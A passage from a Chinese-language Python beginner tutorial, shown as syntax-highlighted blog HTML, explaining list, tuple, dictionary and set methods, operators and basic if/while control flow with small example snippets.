<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">append</span><span class="params">(要追加的元素)</span></span> 往现有的列表里面里面追加一个新的列表项,把参数的整体作为一个列表元素</span><br><span class="line">res = list_info.append(list_tmp)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(list_info)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(res)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">extend</span><span class="params">(另一个列表)</span></span>  通常用于将两个列表合并成一个列表,例如:字符串,列表,元祖,字典</span><br><span class="line">res = list_info.extend(list_tmp)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(list_info)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(res)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">pop</span><span class="params">(指定要删除的元素索引值)</span></span>删除指定的元素,会返回被删除的这个元素的值</span><br><span class="line">res = list_info.pop(<span class="number">3</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(list_info)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(res)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">remove</span><span class="params">(直接指定列表中的某个元素)</span></span> 移除指定的元素,同样会直接改变原有列表</span><br><span class="line">res = list_info.remove(<span class="string">'kali'</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(list_info)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(res)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">reverse</span><span class="params">()</span></span> 反转列表元素,会直接改变原有列表</span><br><span class="line">res = list_info.reverse()</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(list_info)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(res)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">sort</span><span class="params">()</span></span>  对列表中元素进行排序,默认升序</span><br><span class="line">res = list_info.sort()</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(list_info)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(res)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">clear</span><span class="params">()</span></span>   清空列表,单单只是清空列表项,并非删除该列表</span><br><span class="line">res = list_info.<span class="attribute">clear</span>()</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(list_info)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(res)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">copy</span><span class="params">()</span></span> 把列表拷贝一份,属于浅拷贝</span><br><span class="line">new_list = list_info.copy()</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(new_list)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">count</span><span class="params">()</span></span> 统计某个元素在列表中出现的次数</span><br><span class="line">res = list_info.count(<span class="string">'num'</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(list_info)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(res)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">把列表批量替换成字符串,如果列表中只有字符串,可以<span class="string">''</span>.<span class="keyword">join</span>(<span class="keyword">list</span>) 自动循环拼接,如下,</span><br><span class="line">list_info = [<span class="string">'sec'</span>,<span class="string">'ok'</span>,<span class="string">'connect'</span>]</span><br><span class="line">str_res = <span class="string">'-'</span>.<span class="keyword">join</span>(list_info)</span><br><span class="line"><span class="keyword">print</span>(str_res)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">列表中既有字符串又有字符串则需要自己写循环,循环强制str转换成字符串再进行拼接</span><br><span class="line">str_tmp = <span class="string">''</span></span><br><span class="line">list_info = [<span class="string">'sec'</span>,<span class="number">34</span>,<span class="string">'ok'</span>,<span class="string">'connect'</span>,<span class="string">'login'</span>,<span class="string">'succeed'</span>,<span class="number">110</span>]</span><br><span class="line"><span class="keyword">for</span> iterm <span class="keyword">in</span> list_info:</span><br><span class="line">	str_tmp += str(iterm)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str_tmp)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">多层嵌套取值</span><br><span class="line">list_info = [<span class="string">'klion'</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,[<span class="string">'k'</span>,<span class="string">'23'</span>,<span class="string">'this'</span>]],<span class="string">'sec@sec. org'</span>,<span class="string">'hello '</span>,<span class="string">'5324213'</span>,<span class="string">'num'</span>,<span class="string">'pentester'</span>,<span class="string">'kali'</span>]</span><br><span class="line">print(list_info[<span class="number">1</span>][<span class="number">5</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<p>in 及 not in 操作<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">'klion'</span> <span class="keyword">in</span> list_info:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">'yeah is inter! '</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">'Oh No!'</span>)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">'xlion'</span> <span class="keyword">not</span> <span class="keyword">in</span> list_info:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">'yeah is outer! '</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">'Oh No!'</span>)</span><br><span class="line">`</span><br></pre></td></tr></table></figure>
<p>4] 元祖类型,关键字,tuple,用’()’表示,内部一级元素是不可修改的,也就是说对一级元素项不可以增删改查,俗称,’只读列表’,但对于元素项中的子列表是可以修改的,习惯性的在元祖最后多加个逗号,元祖也是有序的</p>
<p>同上,通过索引,切片取值,多层嵌套取值,常用方法,如下:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">count</span><span class="params">(指定要统计次数的元素)</span></span> 统计某个</span><br><span class="line"><span class="function"><span class="title">index</span><span class="params">(指定要获取索引的元素)</span></span> 获取某个元素的索引位置</span><br></pre></td></tr></table></figure></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tuple_res = (<span class="string">'ok'</span>,<span class="string">'connect'</span>,<span class="number">110</span>,<span class="string">'status'</span>,<span class="string">'login'</span>,<span class="number">110</span>,<span class="string">'succeed'</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,(<span class="string">'yeah'</span>,<span class="string">'here'</span>,<span class="string">'linux'</span>,[<span class="number">23</span>,<span class="number">5</span>,<span class="number">354</span>,<span class="number">23</span>],),<span class="number">5</span>],)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(tuple_res)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(tuple_res[<span class="number">0</span>])</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(tuple_res[<span class="number">3</span>:<span class="number">6</span>])</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(tuple_res[<span class="number">2</span>:<span class="number">5</span>])</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(tuple_res.count(<span class="number">110</span>)</span></span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(tuple_res.index(<span class="string">'connect'</span>)</span></span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(tuple_res[<span class="number">7</span>][<span class="number">3</span>][<span class="number">3</span>][<span class="number">2</span>])</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> iterm in <span class="keyword">range</span>(<span class="built_in">len</span>(tuple_res)):</span><br><span class="line">	<span class="built_in">print</span>(iterm,<span class="string">'=&gt;'</span>,tuple_res[iterm])</span><br></pre></td></tr></table></figure>
<p>5] 列表和元祖的一点区别:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">元祖和列表本质几乎是一模一样的,但元祖中的一级元素是不允许修改的而列表中的元素都是可以被随意修改的</span><br></pre></td></tr></table></figure></p>
<p>6] 字典类型,关键字 dict,用’{key-&gt;value}’表示,里面的value可以是任意类型的数据,key可以是数字,字符串,元祖,但它只有索引,不能切片,字典是无序的,默认for循环只有key,另外,元祖,列表,字典可以相互嵌套,类似php中的’数组’<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dict_info = &#123;</span><br><span class="line">	<span class="string">'name'</span>:<span class="string">'klion'</span>,</span><br><span class="line">	<span class="string">'age'</span> :<span class="string">'26'</span>,</span><br><span class="line">	<span class="string">'email'</span>:<span class="string">'sec@sec.org'</span>,</span><br><span class="line">	<span class="string">'phone'</span>:<span class="string">'12334213'</span>,</span><br><span class="line">	<span class="string">'list_info'</span> : &#123;</span><br><span class="line">		<span class="string">'a'</span>:<span class="number">12</span>,</span><br><span class="line">		<span class="string">'b'</span>:<span class="number">13</span>,</span><br><span class="line">		<span class="string">'c'</span>:<span class="number">14</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="string">'city'</span>:[<span class="string">'bj'</span>,<span class="string">'ne'</span>,<span class="string">'ko'</span>,<span class="string">'to'</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>字典是根据键取值的<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print</span><span class="params">(dict_info[<span class="string">'email'</span>])</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(dict_info)</span></span></span><br></pre></td></tr></table></figure></p>
<p>字典常用的一些内置方法:<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get</span>(指定目标字典的<span class="built_in">key</span>) 取出字典中的某个<span class="built_in">key</span>对应的值,如果<span class="built_in">key</span>不存在返回None</span><br><span class="line">gets = dict_info.<span class="built_in">get</span>(<span class="string">'age'</span>)</span><br><span class="line"><span class="built_in">print</span>(gets)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">pop</span><span class="params">()</span></span> 删除字典中指定的值</span><br><span class="line">dels = dict_info.pop(<span class="string">'phone'</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(dels)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(dict_info)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">keys</span><span class="params">()</span></span> 把目标字典中的所有键取出来放到一个新的字典中</span><br><span class="line">keys = dict_info.keys()</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(keys)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">values</span><span class="params">()</span></span>把目标字典中的所有值取出来放到一个新的字典中</span><br><span class="line">values = dict_info.values()</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(values)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">items</span><span class="params">()</span></span>把目标字典中的所有键值取出来放到一个新的字典中</span><br><span class="line">items = dict_info.items()</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(items)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">clear</span><span class="params">()</span></span>清空目标字典,单单只是清空并不是删除</span><br><span class="line">nulls = dict_info.<span class="attribute">clear</span>()</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(nulls)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">update</span><span class="params">()</span></span>更新某个键的值</span><br><span class="line">new_age = dict_info.update(&#123;<span class="string">'name'</span>:<span class="string">'sec'</span>,<span class="string">'age'</span>:<span class="string">'45'</span>&#125;)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(new_age)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(dict_info)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">fromkeys</span><span class="params">()</span></span>  根据指定的key生成一个统一值的字典</span><br><span class="line">allkey = dict_info.fromkeys([<span class="string">'name'</span>,<span class="string">'linces'</span>,<span class="string">'tmp_num'</span>],<span class="number">18</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(allkey)</span></span></span><br></pre></td></tr></table></figure>
<p>7] 集合类型,关键字 set,由不同元素组成,且必须为不可变类型,即字符,数字,元祖,默认是无序的,另外,内部会自动去重</p>
<p>定义一个集合<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">s</span> = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="string">'klion'</span>,<span class="string">'sec@sec.org'</span>,<span class="string">'sec'</span>,<span class="string">'klion'</span>,<span class="string">'kali'</span>,<span class="number">4</span>,<span class="string">'wow'</span>&#125;</span><br><span class="line"><span class="attr">p</span> = &#123;<span class="number">3</span>,<span class="number">5</span>,<span class="string">'sec'</span>,<span class="string">'nuddle'</span>,<span class="string">'backbox'</span>,<span class="string">'fedora'</span>&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">add</span><span class="params">()</span></span> 向集合中添加元素</span><br><span class="line">s.add(<span class="string">'linux'</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(s)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">copy</span><span class="params">()</span></span>  将集合复制一份</span><br><span class="line">new_set = s.copy()</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(new_set)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">pop</span><span class="params">()</span></span>  随机删除集合中的一个元素</span><br><span class="line">s.pop()</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(s)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">clear</span><span class="params">()</span></span> 清空集合中所有的元素,并非删除集合本身</span><br><span class="line">s.<span class="attribute">clear</span>()</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(s)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">remove</span><span class="params">()</span></span> 删除集合中指定的某个元素,如果没有该元素,会报错</span><br><span class="line">s.remove(<span class="string">'klion'</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(s)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">discard</span><span class="params">()</span></span> 删除集合中指定的元素,如果没有该元素,不会报错,常用</span><br><span class="line">s.discard(<span class="string">'xlion'</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(s)</span></span></span><br></pre></td></tr></table></figure>
<p>集合中常用的一些内置方法<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s_n = set(<span class="name">s</span>)</span><br><span class="line">p_n = set(<span class="name">p</span>)</span><br><span class="line">print(<span class="name">s_n</span>)</span><br><span class="line">print(<span class="name">p_n</span>)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">交集 intersection() 或者 &amp;  取出两个集合中的共同部分</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">'交集'</span>,s_n&amp;p_n)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">并集 <span class="class"><span class="keyword">union</span>() 或者 |把两个集合中的所有元素去重合并</span></span><br><span class="line">print(<span class="string">'并集'</span>,s_n|p_n)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">差集 difference() 或者 -  取出s_n中p_n没有的元素</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">'差集'</span>,s_n-p_n)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">补集 symmetric_difference() 或者 ^ 把两个集合合并然后抠除共有元素,留下剩余部分</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">'补集'</span>,s_n^p_n)</span></span></span><br></pre></td></tr></table></figure>
<p>0x13 python 基本数据类型小结:<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对于字符串而言,执行一个功能,都会产生一个新的字符串</span><br><span class="line">对于<span class="built_in">list</span>,tuple,dic,执行一个方法,大多都是直接更新自身</span><br></pre></td></tr></table></figure></p>
<p>0x14 python 常用的一些运算符:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">算数运算符<span class="selector-attr">[ 乘除取余优先级高于加减 ]</span></span><br><span class="line">+(加) <span class="selector-tag">-</span>(减) *(乘以) /(除) <span class="comment">//(直接取整,并非四舍五入) %(取余) **(x**y 表示x的y次方)</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">注意:</span><br><span class="line">如果想在<span class="number">2.7</span>中如果想让<span class="number">9</span>/<span class="number">2</span>输出结果为<span class="number">4.5</span>就必须先引入下面的模块</span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> division   </span><br><span class="line"></span><br><span class="line">python <span class="number">2.7</span> </span><br><span class="line"><span class="number">9</span>/<span class="number">2</span> = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">python <span class="number">3</span>.x</span><br><span class="line"><span class="number">9</span>/<span class="number">2</span> = <span class="number">4.5</span></span><br></pre></td></tr></table></figure>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">赋值运算符</span><br><span class="line"><span class="section">= += -= *= /= %= **= //=</span></span><br></pre></td></tr></table></figure>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">比较运算符<span class="comment">(只返回真假)</span></span><br><span class="line">==<span class="comment">(等于)</span> !=<span class="comment">(不等于)</span> &lt;&gt;<span class="comment">(不等于,相当于!=)</span> &gt;<span class="comment">(大于)</span> &lt;<span class="comment">(小于)</span> &gt;=<span class="comment">(大于或者等于)</span> &lt;=<span class="comment">(小于或等于)</span></span><br></pre></td></tr></table></figure>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">逻辑运算符 [ <span class="keyword">not</span>的优先级最高,平时自己写代码时,最好把逻辑运算都加上括号 ]</span><br><span class="line"><span class="keyword">and</span>(且) <span class="keyword">or</span>(或) <span class="keyword">not</span>(非)</span><br><span class="line"></span><br><span class="line">如果有连续多逻辑运算操作且没加括号,则严格按照从左到右一个个计算,总结规律如下 </span><br><span class="line">真 遇到 <span class="keyword">or</span> 最终结果肯定为真</span><br><span class="line">假 遇到 <span class="keyword">and</span> 最终结果肯定为假</span><br><span class="line"></span><br><span class="line">短路原则</span><br><span class="line"><span class="keyword">and</span> 前面一个条件为假,后面就不再计算了</span><br><span class="line"><span class="keyword">or</span> 前面条件如果为假,后面继续计算</span><br></pre></td></tr></table></figure>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">成员运算符(专门用来寻找一个字符串是否在另一个字符串里面),返回布尔值</span><br><span class="line"><span class="keyword">in</span> </span><br><span class="line"><span class="keyword">not</span> <span class="keyword">in</span></span><br><span class="line">字符 <span class="keyword">in</span> 字符串  	判断某个字符或字符序列是否在某个字符串中</span><br><span class="line">字符 <span class="keyword">not</span> <span class="keyword">in</span> 字符串  判断某个字符或字符序列是否不在某个字符串中</span><br></pre></td></tr></table></figure>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">三元运算符</span><br><span class="line">值<span class="number">1</span>[成立] <span class="keyword">if</span> 条件 <span class="keyword">else</span> 值<span class="number">2</span>[不成立]</span><br><span class="line"><span class="literal">True</span> <span class="keyword">if</span> id &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>0x15 python中常用的一些辅助方法:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">type</span><span class="params">()</span></span> 	查看某个变量的数据类型</span><br><span class="line"><span class="function"><span class="title">id</span><span class="params">()</span></span> 	查看变量在内存中的地址</span><br><span class="line"><span class="function"><span class="title">help</span><span class="params">(type(变量)</span></span>)</span><br><span class="line"><span class="function"><span class="title">dir</span><span class="params">(变量)</span></span></span><br><span class="line"><span class="function"><span class="title">input</span><span class="params">()</span></span> 凡是从input中输入的内容默认都是字符串类型的,如果输入的是字符串数字则需要自己手工用int强制转换下</span><br></pre></td></tr></table></figure></p>
<p>0x16 python 流程控制格式:</p>
<p>条件判断:<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">单分之判断:</span><br><span class="line"><span class="keyword">if</span> 条件:</span><br><span class="line">	条件成立,执行此语句</span><br><span class="line">	条件成立,执行此语句 [ 注意缩进必须一一对应 ]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	条件不成立,执行此语句</span><br></pre></td></tr></table></figure></p>
<p>多分之:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件一:</span><br><span class="line">	条件成立,执行此语句</span><br><span class="line"><span class="keyword">elif</span> 条件二:</span><br><span class="line">	条件成立,执行此语句</span><br><span class="line"><span class="keyword">elif</span> 条件三:</span><br><span class="line">	条件成立,执行此语句</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	条件不成立,执行此语句[ <span class="keyword">pass</span>表示什么都不做 ]</span><br></pre></td></tr></table></figure></p>
<p>循环控制:<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">while 条件<span class="string">[每执行完一次回来看下条件是否还满足,如果满足就继续循环,知道不满足退出循环,务必谨记在最后给退出条件]</span>:</span><br><span class="line">	要循环的语句</span><br></pre></td></tr></table></figure></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> 条件: </span><br><span class="line">	<span class="built_in">..</span><span class="built_in">..</span></span><br><span class="line"><span class="keyword">else</span>: 当上面的条件都不成立时则执行此代码块中语句,只会执行一次</span><br><span class="line">	<span class="built_in">..</span><span class="built_in">..</span></span><br></pre></td></tr></table></figure>
